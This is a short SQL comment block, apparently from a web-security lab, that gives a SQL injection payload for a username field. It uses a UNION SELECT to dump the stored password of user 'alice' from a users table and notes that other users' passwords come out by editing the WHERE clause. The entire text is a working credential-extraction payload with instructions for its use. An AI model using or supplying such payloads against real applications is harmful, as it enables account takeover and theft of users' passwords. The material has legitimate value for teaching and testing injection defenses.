-- You can insert the following input to the username text field
-- to display the password of 'alice'
-- to display the password of others, just change the WHERE

' union select id, password, username from users where username = 'alice';   -- -- -- --